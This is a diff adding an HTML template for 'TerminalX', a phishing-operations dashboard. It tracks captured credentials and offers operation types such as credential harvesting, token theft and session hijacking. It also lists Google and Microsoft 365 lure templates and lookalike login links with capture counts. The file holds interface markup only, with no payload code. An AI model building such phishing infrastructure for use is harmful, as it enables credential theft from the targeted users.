@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TerminalX - Unified Platform</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="noise-overlay"></div>
+    
+    <!-- Scanline Effect -->
+    <div class="scanlines"></div>
+
+    {% if logged_in %}
+    <!-- Dashboard View -->
+    <div class="dashboard">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <span class="logo-icon">▶</span>
+                <span class="logo-text">TerminalX</span>
+                <span class="version-badge">v2.4.1</span>
+            </div>
+            
+            <nav class="sidebar-nav">
+                <a href="#" class="nav-item active">
+                    <span class="nav-icon">📊</span>
+                    <span>Dashboard</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <span class="nav-icon">🎯</span>
+                    <span>Operations</span>
+                    <span class="badge">{{ campaigns|length }}</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <span class="nav-icon">👤</span>
+                    <span>Targets</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <span class="nav-icon">🔗</span>
+                    <span>Generated Links</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <span class="nav-icon">⚙️</span>
+                    <span>Settings</span>
+                </a>
+            </nav>
+
+            <div class="sidebar-footer">
+                <div class="user-info">
+                    <img src="{{ user.picture }}" alt="" class="user-avatar">
+                    <div class="user-details">
+                        <span class="user-name">{{ user.name }}</span>
+                        <span class="user-email">{{ user.email }}</span>
+                    </div>
+                </div>
+                <a href="{{ url_for('logout') }}" class="logout-btn">Logout</a>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="content-header">
+                <h1>Operation Dashboard</h1>
+                <div class="header-actions">
+                    <button class="btn btn-primary" onclick="showNewOperation()">
+                        <span>+</span> New Operation
+                    </button>
+                    <button class="btn btn-secondary">Generate Link</button>
+                </div>
+            </header>
+
+            <!-- Stats Cards -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <span class="stat-label">Total Campaigns</span>
+                        <span class="stat-icon">📊</span>
+                    </div>
+                    <div class="stat-value" id="totalCampaigns">0</div>
+                    <div class="stat-footer">+12% this month</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <span class="stat-label">Active Operations</span>
+                        <span class="stat-icon">🎯</span>
+                    </div>
+                    <div class="stat-value" id="activeOps">0</div>
+                    <div class="stat-footer">Currently running</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <span class="stat-label">Targets Enumerated</span>
+                        <span class="stat-icon">👤</span>
+                    </div>
+                    <div class="stat-value" id="totalTargets">0</div>
+                    <div class="stat-footer">Across all operations</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <span class="stat-label">Credentials Captured</span>
+                        <span class="stat-icon">🔑</span>
+                    </div>
+                    <div class="stat-value" id="capturedCreds">0</div>
+                    <div class="stat-footer">Success rate: 62%</div>
+                </div>
+            </div>
+
+            <!-- Active Operations -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>Active Operations</h2>
+                    <span class="campaign-badge">CAMPAIGN ACTIVE</span>
+                </div>
+                <div class="operations-table">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Operation ID</th>
+                                <th>Name</th>
+                                <th>Type</th>
+                                <th>Status</th>
+                                <th>Targets</th>
+                                <th>Captured</th>
+                                <th>Created</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for campaign in campaigns %}
+                            <tr>
+                                <td><span class="op-id">{{ campaign.id }}</span></td>
+                                <td>{{ campaign.name }}</td>
+                                <td><span class="op-type">{{ campaign.type }}</span></td>
+                                <td><span class="status status-{{ campaign.status.lower() }}">{{ campaign.status }}</span></td>
+                                <td>{{ campaign.targets }}</td>
+                                <td>{{ campaign.captured }}</td>
+                                <td>{{ campaign.created }}</td>
+                                <td><button class="btn btn-small">View</button></td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Recently Generated Links -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>Recently Generated Links</h2>
+                </div>
+                <div class="links-grid">
+                    <div class="link-card">
+                        <div class="link-status status-active"></div>
+                        <div class="link-info">
+                            <span class="link-url">https://secure-login.vercel.app/auth</span>
+                            <span class="link-meta">Clicked 23 times • 12 captures</span>
+                        </div>
+                    </div>
+                    <div class="link-card">
+                        <div class="link-status status-active"></div>
+                        <div class="link-info">
+                            <span class="link-url">https://drive-share.vercel.app/download</span>
+                            <span class="link-meta">Clicked 47 times • 31 captures</span>
+                        </div>
+                    </div>
+                    <div class="link-card">
+                        <div class="link-status status-inactive"></div>
+                        <div class="link-info">
+                            <span class="link-url">https://doc-verify.netlify.app/login</span>
+                            <span class="link-meta">Clicked 8 times • 3 captures</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- New Operation Modal -->
+    <div id="operationModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>New Operation</h2>
+                <button class="modal-close" onclick="closeModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form id="operationForm">
+                    <div class="form-group">
+                        <label>Operation Name</label>
+                        <input type="text" placeholder="e.g., Target Corp - Phase 2" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Operation Type</label>
+                        <select>
+                            <option>Credential Harvesting</option>
+                            <option>Token Theft</option>
+                            <option>Session Hijacking</option>
+                            <option>Reconnaissance</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Target Email / Domain</label>
+                        <input type="text" placeholder="e.g., @targetcompany.com">
+                    </div>
+                    <div class="form-group">
+                        <label>Phishing Template</label>
+                        <select>
+                            <option>Google Login Page</option>
+                            <option>Microsoft 365 Login</option>
+                            <option>Generic Document Share</option>
+                            <option>Custom Template</option>
+                        </select>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
+                <button class="btn btn-primary" onclick="closeModal()">Create Operation</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Panel Floating Button -->
+    <div class="admin-float">
+        <button class="admin-btn" title="Admin Panel">
+            <span class="lock-icon">🔒</span>
+            Admin Panel
+        </button>
+    </div>
+
+    {% else %}
+    <!-- Login View -->
+    <div class="login-container">
+        <div class="login-card">
+            <div class="login-header">
+                <div class="terminal-badge">
+                    <span class="blink-dot"></span>
+                    <span>TerminalX</span>
+                </div>
+                <h1>Unified Platform</h1>
+                <p class="login-subtitle">Authenticate to access the system.</p>
+            </div>
+
+            <div class="login-body">
+                <a href="{{ url_for('login') }}" class="google-btn">
+                    <svg width="20" height="20" viewBox="0 0 48 48">
+                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+                        <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+                        <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+                        <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+                    </svg>
+                    <span>Authenticate with Google</span>
+                </a>
+            </div>
+
+            <div class="login-footer">
+                <div class="status-bar">
+                    <span class="status-dot"></span>
+                    <span class="status-text">Verifying connection secure...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    {% endif %}
+
+    <script>
+        // Load stats when dashboard is shown
+        {% if logged_in %}
+        async function loadStats() {
+            try {
+                const res = await fetch('/api/stats');
+                const stats = await res.json();
+                document.getElementById('totalCampaigns').textContent = stats.total_campaigns;
+                document.getElementById('activeOps').textContent = stats.active_campaigns;
+                document.getElementById('totalTargets').textContent = stats.total_targets;
+                document.getElementById('capturedCreds').textContent = stats.total_captured;
+            } catch(e) {
+                console.log('Stats:', e);
+            }
+        }
+        loadStats();
+
+        function showNewOperation() {
+            document.getElementById('operationModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('operationModal').style.display = 'none';
+        }
+
+        // Close modal on outside click
+        window.onclick = function(event) {
+            const modal = document.getElementById('operationModal');
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        }
+        {% endif %}
+    </script>
+</body>
+</html>
